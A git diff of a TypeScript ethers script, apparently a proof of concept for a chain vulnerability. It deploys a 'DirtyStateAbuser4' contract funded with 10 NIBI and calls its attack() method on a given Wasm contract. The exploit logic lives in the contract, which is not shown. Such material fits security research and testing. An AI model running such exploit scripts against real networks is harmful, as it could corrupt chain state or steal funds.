@@ -10,11 +10,16 @@ const owner = HDNodeWallet.fromPhrase(mnemonic, "", "m/44'/118'/0'/0/0").connect
 
 // get command line arguments
 const COMMAND_LINE_ARGS = process.argv.slice(2)
-const attackContract = COMMAND_LINE_ARGS[0]
-const wasmContract = COMMAND_LINE_ARGS[1]
+const wasmContract = COMMAND_LINE_ARGS[0]
 
 async function main() {
-  const contract = DirtyStateAbuser4__factory.connect(attackContract, owner)
+  const factory = new DirtyStateAbuser4__factory(owner);
+  const contract = await factory.deploy(
+    {
+      value: "10000000000000000000" // 10 NIBI
+    });
+
+  await contract.waitForDeployment()
   console.log("contract address: ", await contract.getAddress())
 
   const msgBz = toUtf8Bytes(JSON.stringify({
@@ -26,7 +31,7 @@ async function main() {
   const txResponse = await contract.attack(wasmContract, msgBz, {
     gasLimit: 200_000,
   })
-  console.log("tx: ", txResponse)
+  console.log("txResponse: ", txResponse)
   const txReceipt = await jsonRpcProvider.waitForTransaction(txResponse.hash)
   console.log("txReceipt: ", txReceipt)
 
